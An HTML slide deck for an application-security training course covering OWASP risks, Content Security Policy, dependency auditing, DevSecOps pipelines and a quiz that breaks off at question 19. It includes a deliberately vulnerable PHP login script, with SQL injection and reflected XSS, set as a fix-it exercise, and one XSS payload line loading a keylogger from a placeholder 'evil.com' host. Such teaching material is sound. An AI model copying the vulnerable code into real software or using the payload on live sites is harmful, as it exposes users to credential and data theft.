<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cybersecurity Software Analyst Training</title>
    <link rel="icon" href="assets/images/logo.png" type="image/x-icon">
    <link rel="stylesheet" href="assets/styles/main.css">
    <link rel="stylesheet" href="assets/styles/software-analyst.css">
</head>
<body>
    <div class="presentation-container">
        <div class="slide-counter">
            <span id="currentSlide">1</span> / <span id="totalSlides"></span>
        </div>

        <div class="slide active">
            <div class="title-slide">
                <div class="security-icon">&lt;/&gt;</div>
                <h1>Cybersecurity Software Analyst</h1>
                <p class="subtitle">Securing Applications from Code to Cloud</p>
                <div class="highlight">
                    <h3>Comprehensive AppSec Training Program</h3>
                    <p>Building Resilient Web Architectures (PHP, JavaScript, CSS)</p>
                    <p><strong>Hands-On Learning with Code-Level Solutions</strong></p>
                </div>
            </div>
        </div>

        <div class="slide">
            <h1>Session 1: The Modern Application Threat Landscape</h1>
            
            <h2>The OWASP Top 10 Context</h2>
            <div style="text-align: center; margin: var(--space-lg) 0;">
                <img src="assets/images/software-analyst/1.png" alt="OWASP Top 10 Vulnerabilities Overview" style="max-width: 100%; border-radius: var(--radius-md);">
            </div>
            <ul>
                <li><strong>Broken Access Control:</strong> Users bypassing intended permissions.</li>
                <li><strong>Cryptographic Failures:</strong> Exposing sensitive data due to weak algorithms.</li>
                <li><strong>Injection Flaws:</strong> SQL, NoSQL, and Command injection via untrusted input.</li>
                <li><strong>Insecure Design:</strong> Missing architectural security controls.</li>
                <li><strong>Security Misconfiguration:</strong> Default accounts, exposed cloud storage.</li>
            </ul>

            <div class="highlight">
                <h2>The Shift to the Frontend</h2>
                <p>Modern applications rely heavily on client-side rendering (CSS/JavaScript). Attackers have shifted focus to exploiting the frontend via Cross-Site Scripting (XSS), DOM manipulation, and third-party script supply chain attacks.</p>
            </div>

            <h2>Common Development Pitfalls</h2>
            <ul>
                <li>Concatenating raw variables into database queries (SQLi).</li>
                <li>Failing to sanitize output rendered to the DOM (XSS).</li>
                <li>Hardcoding API keys in public version control (GitHub).</li>
                <li>Using outdated `npm` or `composer` packages with known CVEs.</li>
                <li>Improper session management and predictable session IDs.</li>
            </ul>

            <div class="case-study">
                <h3>Case Study 1: The Frontend Supply Chain (Magecart)</h3>
                <div style="text-align: center; margin: var(--space-md) 0;">
                    <img src="assets/images/software-analyst/2.png" alt="Magecart Supply Chain Attack Flow" style="max-width: 100%; border-radius: var(--radius-md);">
                </div>
                <p>A rapidly growing e-commerce platform in Soweto integrated a third-party analytics script into their global CSS/JS pipeline. Attackers compromised the analytics provider and injected malicious JavaScript into the script. Without a Content Security Policy (CSP) in place, the malicious JS skimmed credit card details directly from the frontend checkout form, bypassing all backend PHP security controls entirely.</p>
            </div>
        </div>

        <div class="slide">
            <h1>🔬 Hands-On Lab: AppSec Risk Assessment</h1>
            
            <div class="interactive-lab">
                <h2>Software Development Lifecycle (SDLC) Assessment Tool</h2>
                <div style="text-align: center; margin: var(--space-md) 0;">
                    <img src="assets/images/software-analyst/3.png" alt="Secure SDLC and CI/CD Pipeline Integration" style="max-width: 100%; border-radius: var(--radius-md);">
                </div>
                <div class="practice-exercise">
                    <div class="practice-title">Evaluate Your CI/CD Security Maturity</div>
                    
                    <div class="security-checklist">
                        <h3>Current Development Practices:</h3>
                        <div class="checklist-item">
                            <input type="checkbox" class="risk-checkbox" id="risk1" data-weight="5">
                            <label for="risk1">Do you enforce Parameterized Queries (PDO/Prepared Statements) globally?</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="risk-checkbox" id="risk2" data-weight="5">
                            <label for="risk2">Is a SAST (Static Application Security Testing) tool integrated into your IDE/Pipeline?</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="risk-checkbox" id="risk3" data-weight="4">
                            <label for="risk3">Are CSRF tokens implemented on all state-changing state/POST requests?</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="risk-checkbox" id="risk4" data-weight="3">
                            <label for="risk4">Do you run automated dependency checks (e.g., npm audit, Dependabot)?</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="risk-checkbox" id="risk5" data-weight="4">
                            <label for="risk5">Is a strict Content Security Policy (CSP) implemented on the frontend?</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="risk-checkbox" id="risk6" data-weight="5">
                            <label for="risk6">Are secrets (API keys, DB creds) managed via Vault/Env files and excluded from git?</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="risk-checkbox" id="risk7" data-weight="3">
                            <label for="risk7">Do you enforce strict input validation and output encoding on all user data?</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="risk-checkbox" id="risk8" data-weight="4">
                            <label for="risk8">Are authentication routines protected against brute-force (rate limiting)?</label>
                        </div>
                    </div>
                    
                    <button class="simulation-button" onclick="calculateAppSecRiskScore()">Calculate SDLC Security Score</button>
                    <div id="risk-assessment-result" class="simulation-result"></div>
                </div>
            </div>

            <div class="solution-box">
                <div class="solution-title">Essential Open-Source AppSec Tools</div>
                <div class="resource-link">
                    <strong>OWASP ZAP:</strong> DAST tool for finding vulnerabilities in live web applications.
                </div>
                <div class="resource-link">
                    <strong>SonarQube:</strong> Continuous inspection of code quality and SAST vulnerability hunting.
                </div>
                <div class="resource-link">
                    <strong>Snyk / Dependabot:</strong> Developer-first SCA (Software Composition Analysis) for identifying vulnerable dependencies.
                </div>
            </div>
        </div>

        <div class="slide">
            <h1>🎯 Workshop: Secure Code Review</h1>
            
            <div class="hands-on-section">
                <div class="hands-on-title">Identify the Vulnerabilities</div>
                
                <div class="scenario-box">
                    <h3>Scenario: LMS Authentication Bypass</h3>
                    <p>You are reviewing the backend authentication code for a new Learning Management System (LMS) developed for the GICD portal. Analyze the PHP script below and rewrite it securely.</p>
                </div>
                <div style="text-align: center; margin: var(--space-md) 0;">
                    <img src="assets/images/software-analyst/4.png" alt="SQL Injection vs Parameterized Query Architecture" style="max-width: 100%; border-radius: var(--radius-md);">
                </div>

                <div class="practice-exercise">
                    <div class="demo-box">
                        <h4>Vulnerable PHP Code (login.php)</h4>
                        <div class="code-block">
<span class="code-keyword">&lt;?php</span>
<span class="code-variable">$conn</span> = <span class="code-keyword">new</span> <span class="code-function">mysqli</span>(<span class="code-string">"localhost"</span>, <span class="code-string">"root"</span>, <span class="code-string">""</span>, <span class="code-string">"gicd_lms"</span>);

<span class="code-variable">$email</span> = <span class="code-variable">$_POST</span>[<span class="code-string">'email'</span>];
<span class="code-variable">$password</span> = <span class="code-variable">$_POST</span>[<span class="code-string">'password'</span>];

<span class="code-comment">// Vulnerable query construction</span>
<span class="code-variable">$query</span> = <span class="code-string">"SELECT * FROM users WHERE email = '"</span> . <span class="code-variable">$email</span> . <span class="code-string">"' AND password = '"</span> . <span class="code-variable">$password</span> . <span class="code-string">"'"</span>;

<span class="code-variable">$result</span> = <span class="code-variable">$conn</span>-&gt;<span class="code-function">query</span>(<span class="code-variable">$query</span>);

<span class="code-keyword">if</span> (<span class="code-variable">$result</span>-&gt;<span class="code-property">num_rows</span> > <span class="code-string">0</span>) {
    <span class="code-keyword">echo</span> <span class="code-string">"&lt;div class='welcome'&gt;Welcome back, "</span> . <span class="code-variable">$_GET</span>[<span class="code-string">'name'</span>] . <span class="code-string">"&lt;/div&gt;"</span>;
}
<span class="code-keyword">?&gt;</span>
                        </div>
                        
                        <h4 style="margin-top: 20px;">Fix the Code:</h4>
                        <textarea id="code-fix-input" style="width: 100%; height: 150px; padding: 10px; border: 2px solid #673ab7; border-radius: 8px; font-family: monospace;" placeholder="Rewrite the query using secure practices..."></textarea>
                        <br><br>
                        <button class="simulation-button" onclick="analyzeVulnerableCode()">Validate Secure Code</button>
                        <div id="code-validation" class="simulation-result"></div>
                    </div>
                </div>
            </div>
        </div>

        <div class="slide">
            <h1>Session 2: Core Defense Mechanisms (Part 1)</h1>
            
            <h2>Input Validation & Output Encoding</h2>
            <div style="text-align: center; margin: var(--space-md) 0;">
                <img src="assets/images/software-analyst/5.png" alt="Cross-Site Scripting (XSS) Execution Flow" style="max-width: 100%; border-radius: var(--radius-md);">
            </div>
            <ul>
                <li>Never trust data originating from the client.</li>
                <li>Use strict allow-lists for input validation (e.g., `filter_var` in PHP).</li>
                <li>Context-aware output encoding is mandatory to prevent XSS (HTML, JS, CSS contexts).</li>
                <li>Utilize modern templating engines (Twig, Blade, React, Vue) that auto-escape by default.</li>
            </ul>

            <h2>Authentication & Session Management</h2>
            <ul>
                <li>Implement argon2 or bcrypt for password hashing; never use MD5 or SHA1.</li>
                <li>Set Secure, HttpOnly, and SameSite flags on all session cookies.</li>
                <li>Implement multi-factor authentication (MFA) for administrative routes.</li>
                <li>Invalidate session IDs upon privilege changes and timeouts.</li>
            </ul>

            <h2>Architectural Defenses</h2>
            <ul>
                <li><strong>CORS (Cross-Origin Resource Sharing):</strong> Restrict which domains can interact with your APIs.</li>
                <li><strong>CSP (Content Security Policy):</strong> Mitigate XSS and data injection by declaring approved origins for executable scripts.</li>
                <li><strong>Rate Limiting:</strong> Protect endpoints from brute-force and DoS attacks.</li>
            </ul>

            <div class="case-study">
                <h3>Case Study 2: The E-Commerce XSS Takeover</h3>
                <p>A developer working on an e-commerce platform utilized JavaScript to dynamically render the contents of the user's shopping cart. Because they used `innerHTML` instead of `textContent` with unsanitized user input (product names), an attacker created a product named <code>&lt;script src="evil.com/keylogger.js"&gt;&lt;/script&gt;</code>. The attack was entirely mitigated once the engineering team deployed a strict Content Security Policy.</p>
            </div>
        </div>

        <div class="slide">
            <h1>🔐 Lab: Content Security Policy Configuration</h1>
            
            <div class="interactive-lab">
                <h2>Building a Defensive Frontend Perimeter</h2>
                <div style="text-align: center; margin: var(--space-md) 0;">
                    <img src="assets/images/software-analyst/6.png" alt="Content Security Policy (CSP) Architecture" style="max-width: 100%; border-radius: var(--radius-md);">
                </div>
                <div class="solution-box">
                    <div class="solution-title">CSP Directives Explained</div>
                    <div class="tool-grid">
                        <div class="tool-card">
                            <h3>default-src</h3>
                            <ul>
                                <li>The fallback directive.</li>
                                <li>If a specific directive (like script-src) is missing, the browser uses this.</li>
                                <li>Best practice: set to 'none' or 'self'.</li>
                            </ul>
                        </div>
                        <div class="tool-card">
                            <h3>script-src</h3>
                            <ul>
                                <li>Controls where JavaScript can be loaded and executed from.</li>
                                <li>Blocks inline scripts (<code>&lt;script&gt;</code>) unless explicitly allowed.</li>
                                <li>Vital for preventing XSS.</li>
                            </ul>
                        </div>
                        <div class="tool-card">
                            <h3>style-src</h3>
                            <ul>
                                <li>Controls the sources of stylesheets.</li>
                                <li>Prevents malicious CSS injection which can lead to data exfiltration.</li>
                            </ul>
                        </div>
                        <div class="tool-card">
                            <h3>connect-src</h3>
                            <ul>
                                <li>Restricts the URLs which can be loaded using script interfaces.</li>
                                <li>Secures Fetch, XHR, and WebSockets.</li>
                            </ul>
                        </div>
                    </div>
                </div>

                <div class="practice-exercise">
                    <div class="practice-title">Interactive CSP Generator</div>
                    <p>Build a secure CSP header for an application that needs to load local scripts, Google Fonts, and communicate with its own API.</p>
                    
                    <div class="security-checklist">
                        <div class="checklist-item">
                            <input type="checkbox" class="csp-checkbox" id="csp-default" value="default-src 'self';">
                            <label for="csp-default">Restrict default resources to the same origin ('self')</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="csp-checkbox" id="csp-script" value="script-src 'self' https://trusted-cdn.com;">
                            <label for="csp-script">Allow scripts from 'self' and a trusted CDN</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="csp-checkbox" id="csp-unsafe" value="script-src 'unsafe-inline';">
                            <label for="csp-unsafe">Allow 'unsafe-inline' scripts (Warning: XSS Risk)</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="csp-checkbox" id="csp-style" value="style-src 'self' https://fonts.googleapis.com;">
                            <label for="csp-style">Allow stylesheets from 'self' and Google Fonts</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="csp-checkbox" id="csp-connect" value="connect-src 'self' api.payment-gateway.com;">
                            <label for="csp-connect">Restrict API connections (Fetch/XHR) to internal and payment API</label>
                        </div>
                    </div>
                    
                    <div class="demo-box">
                        <h4>Generated Header:</h4>
                        <div class="code-block" id="generated-csp" style="min-height: 50px;">
                            Content-Security-Policy: 
                        </div>
                        <br>
                        <button class="simulation-button" onclick="generateCSP()">Evaluate Policy Strength</button>
                        <div id="csp-evaluation-result" class="simulation-result"></div>
                    </div>
                </div>
            </div>
        </div>

        <div class="slide">
            <h1>Session 2: Securing the Supply Chain (Part 2)</h1>
            
            <h2>Software Composition Analysis (SCA)</h2>
            <div style="text-align: center; margin: var(--space-md) 0;">
                <img src="assets/images/software-analyst/7.png" alt="SCA Dependency Tree and Vulnerabilities" style="max-width: 100%; border-radius: var(--radius-md);">
            </div>
            <ul>
                <li>Modern applications consist of 70-90% third-party open-source code.</li>
                <li>Vulnerabilities in dependencies (NPM, Composer, PyPI) are inherited by your application.</li>
                <li>Implement automated SCA tools in your CI/CD pipeline to block builds containing known CVEs.</li>
                <li>Regularly update and prune unused libraries.</li>
            </ul>

            <h2>Secrets Management</h2>
            <ul>
                <li>Never hardcode database credentials, API keys, or JWT secrets in source code.</li>
                <li>Use environment variables (`.env` files) that are strictly excluded via `.gitignore`.</li>
                <li>For enterprise apps, utilize dedicated vaults (HashiCorp Vault, AWS Secrets Manager).</li>
                <li>Implement pre-commit hooks (like `git-secrets` or `trufflehog`) to prevent accidental commits.</li>
            </ul>

            <div class="case-study">
                <h3>Case Study 3: The Trading Bot Leak</h3>
                <p>A developer created an algorithmic day trading application. During a routine commit, they accidentally pushed their Alpaca Trading API keys to a public GitHub repository. Within 3 seconds, automated bots scraped the keys and executed unauthorized trades, draining the account. Implementing a simple pre-commit hook scanning for regex patterns of API keys would have prevented the disaster.</p>
            </div>
        </div>

        <div class="slide">
            <h1>👁️ Lab: Dependency Vulnerability Audit</h1>
            
            <div class="interactive-lab">
                <h2>Analyzing Package Vulnerabilities</h2>
                
                <div class="hands-on-section">
                    <div class="hands-on-title">SCA Output Analysis Exercise</div>
                    <div class="demo-box">
                        <h4>Sample <code>npm audit</code> Output</h4>
                        <div style="background: #282c34; color: #abb2bf; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; overflow-x: auto;">
=== npm audit security report ===<br><br>

<span style="color: #e06c75;">High</span>            Prototype Pollution<br>
Package         <span style="color: #61afef;">lodash</span><br>
Patched in      >=4.17.11<br>
Dependency of   react-scripts<br>
Path            react-scripts &gt; lodash<br>
More info       https://npmjs.com/advisories/782<br><br>

<span style="color: #e5c07b;">Moderate</span>        Regular Expression Denial of Service<br>
Package         <span style="color: #61afef;">marked</span><br>
Patched in      >=0.6.2<br>
Dependency of   webpack<br>
Path            webpack &gt; marked<br>
More info       https://npmjs.com/advisories/812<br><br>

found 2 vulnerabilities (1 moderate, 1 high)
                        </div>
                        <br>
                        <button class="simulation-button" onclick="analyzeDependencyAudit()">Formulate Remediation Plan</button>
                        <div id="audit-analysis-result" class="simulation-result"></div>
                    </div>
                </div>
            </div>
            
            <div class="solution-box">
                <div class="solution-title">Remediation Strategies</div>
                <ul>
                    <li><strong>Direct Updates:</strong> Run `npm update &lt;package-name&gt;` or `composer update`.</li>
                    <li><strong>Transitive Dependencies:</strong> Use package resolutions/overrides in your `package.json` to force sub-dependencies to update.</li>
                    <li><strong>Vulnerability Exceptions:</strong> If a patch breaks the build, evaluate if the vulnerable code path is actually reachable by user input in your application context.</li>
                </ul>
            </div>
        </div>

        <div class="slide">
            <h1>Session 3: Integrating DevSecOps</h1>
            
            <h2>The Shift-Left Philosophy</h2>
            <div style="text-align: center; margin: var(--space-md) 0;">
                <img src="assets/images/software-analyst/8.png" alt="Shift-Left DevSecOps Pipeline Phases" style="max-width: 100%; border-radius: var(--radius-md);">
            </div>
            <ul>
                <li>Move security testing earlier in the development lifecycle (to the developer's laptop).</li>
                <li>Find and fix vulnerabilities before they reach production, reducing costs significantly.</li>
                <li>Empower developers with tooling rather than creating security bottlenecks.</li>
            </ul>

            <h2>The DevSecOps Pipeline</h2>
            <div class="three-column">
                <div class="card">
                    <h3>1. Commit</h3>
                    <p>Pre-commit hooks check for secrets and run basic linting/SAST rules locally.</p>
                </div>
                <div class="card">
                    <h3>2. Build/CI</h3>
                    <p>Deep SAST scans (SonarQube) and SCA (Snyk) run on pull requests. Build fails on High/Critical findings.</p>
                </div>
                <div class="card">
                    <h3>3. Deploy/CD</h3>
                    <p>DAST (ZAP) scans the staging environment dynamically. Infrastructure as Code (IaC) is validated.</p>
                </div>
            </div>

            <h2>Fostering Developer Security Champions</h2>
            <ul>
                <li>Train developers in secure coding frameworks (OWASP ASVS).</li>
                <li>Conduct blameless post-mortems on security incidents.</li>
                <li>Reward engineering teams that proactively refactor technical security debt.</li>
            </ul>
        </div>

        <div class="slide">
            <h1>🤖 Workshop: CI/CD Pipeline Automation</h1>
            
            <div class="interactive-lab">
                <h2>Building a Secure GitHub Actions Workflow</h2>
                
                <div class="hands-on-section">
                    <div class="hands-on-title">Sample YAML Security Pipeline</div>
                    <div class="solution-box">
                        <div class="demo-box">
                            <h4>.github/workflows/security.yml</h4>
                            <div class="code-block">
<span class="code-keyword">name:</span> <span class="code-string">DevSecOps Pipeline</span>
<span class="code-keyword">on:</span> [<span class="code-string">push</span>, <span class="code-string">pull_request</span>]

<span class="code-keyword">jobs:</span>
  <span class="code-keyword">sast-scan:</span>
    <span class="code-keyword">runs-on:</span> <span class="code-string">ubuntu-latest</span>
    <span class="code-keyword">steps:</span>
      - <span class="code-keyword">uses:</span> <span class="code-string">actions/checkout@v3</span>
      - <span class="code-keyword">name:</span> <span class="code-string">Run SonarCloud Scan</span>
        <span class="code-keyword">uses:</span> <span class="code-string">SonarSource/sonarcloud-github-action@master</span>
        <span class="code-keyword">env:</span>
          <span class="code-keyword">SONAR_TOKEN:</span> <span class="code-string">${{ secrets.SONAR_TOKEN }}</span>

  <span class="code-keyword">secret-scan:</span>
    <span class="code-keyword">runs-on:</span> <span class="code-string">ubuntu-latest</span>
    <span class="code-keyword">steps:</span>
      - <span class="code-keyword">uses:</span> <span class="code-string">actions/checkout@v3</span>
      - <span class="code-keyword">name:</span> <span class="code-string">TruffleHog OSS</span>
        <span class="code-keyword">uses:</span> <span class="code-string">trufflesecurity/trufflehog@main</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="practice-exercise">
                        <div class="practice-title">Pipeline Strategy Generator</div>
                        <button class="simulation-button" onclick="generateDevSecOpsRoadmap()">Generate Pipeline Strategy</button>
                        <div id="pipeline-roadmap-result" class="simulation-result"></div>
                    </div>
                </div>
            </div>
        </div>

        <div class="slide">
            <h1>🔧 Lab: AppSec Tool Selection & Budgeting</h1>
            
            <div class="interactive-lab">
                <h2>Application Security Tools Assessment</h2>
                
                <div class="practice-exercise">
                    <div class="practice-title">Budgetary Planning for AppSec</div>
                    <div class="demo-box">
                        <h4>Calculate Your SDLC Security Investment</h4>
                        <div style="margin-bottom: 15px;">
                            <label>Number of Developers: </label>
                            <input type="number" id="dev-count" placeholder="10" style="padding: 5px; margin: 5px; border: 1px solid #ccc; border-radius: 3px;">
                            <br>
                            <label>Application Risk Profile: </label>
                            <select id="risk-profile" style="padding: 5px; margin: 5px;">
                                <option value="standard">Standard (Informational/Marketing sites)</option>
                                <option value="enhanced">Enhanced (E-commerce, Portals, LMS)</option>
                                <option value="premium">Premium (Financial/Trading, Healthcare)</option>
                            </select>
                        </div>
                        <button class="simulation-button" onclick="calculateAppSecROI()">Calculate AppSec Budget</button>
                        <div id="budget-calculation-result" class="simulation-result"></div>
                    </div>
                </div>
            </div>
        </div>

        <div class="slide">
            <h1>Implementation Best Practices and Action Plan</h1>
            
            <h2>Building an AppSec Program</h2>
            <ul>
                <li><strong>Phase 1: Visibility.</strong> Inventory all code repositories, APIs, and third-party dependencies.</li>
                <li><strong>Phase 2: Quick Wins.</strong> Implement automated SCA (dependency scanning) and secret scanning.</li>
                <li><strong>Phase 3: Integration.</strong> Embed SAST tools into developer IDEs and CI/CD pipelines.</li>
                <li><strong>Phase 4: Dynamic Testing.</strong> Introduce DAST and interactive testing in staging environments.</li>
                <li><strong>Phase 5: Continuous Maturity.</strong> Implement Bug Bounties and regular external Penetration Testing.</li>
            </ul>

            <div class="highlight">
                <h3>The Secure Developer Mindset</h3>
                <ul>
                    <li>Security is a feature, not an afterthought.</li>
                    <li>Deny by default; fail securely.</li>
                    <li>Defense in depth: don't rely on a single control (e.g., rely on both WAF and input validation).</li>
                    <li>Log security events, but never log sensitive user data or tokens.</li>
                </ul>
            </div>
        </div>

        <div class="slide">
            <h1>🛡️ Advanced Security Assessment</h1>
            
            <div class="interactive-lab">
                <h2>API Breach Simulation</h2>
                <div style="text-align: center; margin: var(--space-md) 0;">
                    <img src="assets/images/software-analyst/9.png" alt="API Breach and Secrets Exfiltration Diagram" style="max-width: 100%; border-radius: var(--radius-md);">
                </div>
                <div class="scenario-box">
                    <h3>Emergency Scenario: Exposed Environment File</h3>
                    <p>An automated scanner alerts you that a `.env` file containing production database credentials and API keys was accidentally deployed to a public web directory on your live server.</p>
                </div>
                <button class="simulation-button" onclick="runApiBreachSimulation()">Launch Incident Response Drill</button>
                <div id="breach-response-result" class="simulation-result"></div>
            </div>
            
            <div class="interactive-lab">
                <h2>Broken Access Control Simulation</h2>
                <div class="scenario-box">
                    <h3>Scenario: Insecure Direct Object Reference (IDOR)</h3>
                    <p>During testing, an analyst notices that navigating to `/api/user/receipt?id=105` displays their receipt. Changing the URL to `/api/user/receipt?id=106` displays another user's receipt.</p>
                </div>
                <button class="simulation-button" onclick="runIdorSimulation()">Analyze IDOR Vulnerability</button>
                <div id="idor-result" class="simulation-result"></div>
            </div>

            <div class="interactive-lab">
                <h2>OWASP ASVS Compliance Check</h2>
                <div class="practice-exercise">
                    <div class="practice-title">Application Security Verification Standard</div>
                    <div class="security-checklist">
                        <div class="checklist-item">
                            <input type="checkbox" class="compliance-checkbox" id="comp1">
                            <label for="comp1">All inputs are validated against a strict allow-list</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="compliance-checkbox" id="comp2">
                            <label for="comp2">Database queries use parameterized interfaces</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="compliance-checkbox" id="comp3">
                            <label for="comp3">Authentication credentials are hashed using Argon2 or PBKDF2</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="compliance-checkbox" id="comp4">
                            <label for="comp4">Session tokens are generated using a cryptographically secure PRNG</label>
                        </div>
                        <div class="checklist-item">
                            <input type="checkbox" class="compliance-checkbox" id="comp5">
                            <label for="comp5">API endpoints implement authorization checks on every request</label>
                        </div>
                    </div>
                    <button class="simulation-button" onclick="assessOWASPCompliance()">Assess ASVS Level 1</button>
                    <div id="compliance-result" class="simulation-result"></div>
                </div>
            </div>
        </div>

        <div class="slide">
            <h1>Assessment: Test Your AppSec Knowledge</h1>
            
            <div class="quiz-container">
                <div class="question" id="q1">
                    <h4>1. What does OWASP stand for?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Online Web Application Security Program</li>
                        <li data-answer="correct">Open Worldwide Application Security Project</li>
                        <li data-answer="wrong">Object-Oriented Web Security Protocol</li>
                        <li data-answer="wrong">Overarching Web Authentication Standard</li>
                    </ul>
                </div>

                <div class="question" id="q2">
                    <h4>2. Which vulnerability is prevented by using Parameterized Queries (Prepared Statements)?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Cross-Site Scripting (XSS)</li>
                        <li data-answer="wrong">Broken Authentication</li>
                        <li data-answer="correct">SQL Injection</li>
                        <li data-answer="wrong">Cross-Site Request Forgery (CSRF)</li>
                    </ul>
                </div>

                <div class="question" id="q3">
                    <h4>3. SAST tools operate by analyzing:</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Live, running applications</li>
                        <li data-answer="correct">Source code at rest</li>
                        <li data-answer="wrong">Network traffic packets</li>
                        <li data-answer="wrong">Hardware logic gates</li>
                    </ul>
                </div>

                <div class="question" id="q4">
                    <h4>4. What is the primary defense against Cross-Site Request Forgery (CSRF)?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Input validation</li>
                        <li data-answer="correct">Anti-CSRF tokens and SameSite cookies</li>
                        <li data-answer="wrong">Output encoding</li>
                        <li data-answer="wrong">Database encryption</li>
                    </ul>
                </div>

                <div class="question" id="q5">
                    <h4>5. What does DAST stand for?</h4>
                    <ul class="quiz-options">
                        <li data-answer="correct">Dynamic Application Security Testing</li>
                        <li data-answer="wrong">Data Analysis and Security Tool</li>
                        <li data-answer="wrong">Distributed Application Scanning Tech</li>
                        <li data-answer="wrong">Domain Authentication Security Token</li>
                    </ul>
                </div>

                <div class="question" id="q6">
                    <h4>6. Which HTTP header is best for mitigating XSS attacks?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">X-Frame-Options</li>
                        <li data-answer="wrong">Strict-Transport-Security</li>
                        <li data-answer="correct">Content-Security-Policy (CSP)</li>
                        <li data-answer="wrong">Access-Control-Allow-Origin</li>
                    </ul>
                </div>

                <div class="question" id="q7">
                    <h4>7. Storing passwords in a database securely requires:</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Base64 encoding</li>
                        <li data-answer="wrong">Two-way symmetric encryption (AES)</li>
                        <li data-answer="correct">Hashing with a strong salt (e.g., Argon2/Bcrypt)</li>
                        <li data-answer="wrong">Obfuscation</li>
                    </ul>
                </div>

                <div class="question" id="q8">
                    <h4>8. An attacker modifies a hidden HTML form field `price` from 100 to 1. What type of vulnerability is this if the backend accepts it?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">SQL Injection</li>
                        <li data-answer="correct">Insecure Direct Object Reference / Broken Access Control</li>
                        <li data-answer="wrong">Buffer Overflow</li>
                        <li data-answer="wrong">Cross-Site Scripting</li>
                    </ul>
                </div>

                <div class="question" id="q9">
                    <h4>9. Which of the following should NEVER be pushed to a Git repository?</h4>
                    <ul class="quiz-options">
                        <li data-answer="correct">.env files containing production API keys</li>
                        <li data-answer="wrong">README.md</li>
                        <li data-answer="wrong">package-lock.json</li>
                        <li data-answer="wrong">Unit testing scripts</li>
                    </ul>
                </div>

                <div class="question" id="q10">
                    <h4>10. What is Software Composition Analysis (SCA) used for?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Checking code syntax errors</li>
                        <li data-answer="wrong">Monitoring server uptime</li>
                        <li data-answer="correct">Identifying known vulnerabilities in open-source dependencies</li>
                        <li data-answer="wrong">Compiling the final binary</li>
                    </ul>
                </div>

                <div class="question" id="q11">
                    <h4>11. Setting a cookie flag to `HttpOnly` prevents:</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">The cookie from being sent over HTTP</li>
                        <li data-answer="correct">Client-side JavaScript from reading the cookie</li>
                        <li data-answer="wrong">The cookie from expiring</li>
                        <li data-answer="wrong">Cross-origin requests</li>
                    </ul>
                </div>

                <div class="question" id="q12">
                    <h4>12. Which vulnerability involves an attacker executing malicious scripts in the victim's browser?</h4>
                    <ul class="quiz-options">
                        <li data-answer="correct">Cross-Site Scripting (XSS)</li>
                        <li data-answer="wrong">Server-Side Request Forgery (SSRF)</li>
                        <li data-answer="wrong">Directory Traversal</li>
                        <li data-answer="wrong">Command Injection</li>
                    </ul>
                </div>

                <div class="question" id="q13">
                    <h4>13. What is the most effective way to prevent Server-Side Request Forgery (SSRF)?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Output encoding</li>
                        <li data-answer="correct">Validating target URLs against a strict allow-list</li>
                        <li data-answer="wrong">Using HTTPS</li>
                        <li data-answer="wrong">Implementing CSRF tokens</li>
                    </ul>
                </div>

                <div class="question" id="q14">
                    <h4>14. "Shift Left" in DevSecOps means:</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Moving security to the end of the project</li>
                        <li data-answer="wrong">Ignoring security completely</li>
                        <li data-answer="correct">Integrating security checks as early as possible in the SDLC</li>
                        <li data-answer="wrong">Changing the UI alignment</li>
                    </ul>
                </div>

                <div class="question" id="q15">
                    <h4>15. Which function is inherently dangerous and should be avoided in JavaScript?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">console.log()</li>
                        <li data-answer="correct">eval()</li>
                        <li data-answer="wrong">JSON.parse()</li>
                        <li data-answer="wrong">document.getElementById()</li>
                    </ul>
                </div>

                <div class="question" id="q16">
                    <h4>16. If a developer uses `innerHTML` with untrusted input, what attack is likely?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">SQL Injection</li>
                        <li data-answer="correct">DOM-based XSS</li>
                        <li data-answer="wrong">CSRF</li>
                        <li data-answer="wrong">Clickjacking</li>
                    </ul>
                </div>

                <div class="question" id="q17">
                    <h4>17. CORS is a mechanism that:</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">Encrypts database tables</li>
                        <li data-answer="correct">Allows servers to specify which origins can access their assets in a browser</li>
                        <li data-answer="wrong">Validates user passwords</li>
                        <li data-answer="wrong">Stops DDoS attacks</li>
                    </ul>
                </div>

                <div class="question" id="q18">
                    <h4>18. To securely retrieve a user record in PHP/MySQL, you should use:</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">mysql_query() with concatenated strings</li>
                        <li data-answer="wrong">base64_decode() on the user input</li>
                        <li data-answer="correct">PDO with prepare() and execute()</li>
                        <li data-answer="wrong">eval() on the database result</li>
                    </ul>
                </div>

                <div class="question" id="q19">
                    <h4>19. Directory Traversal (Path Traversal) attacks attempt to:</h4>
                    <ul class="quiz-options">
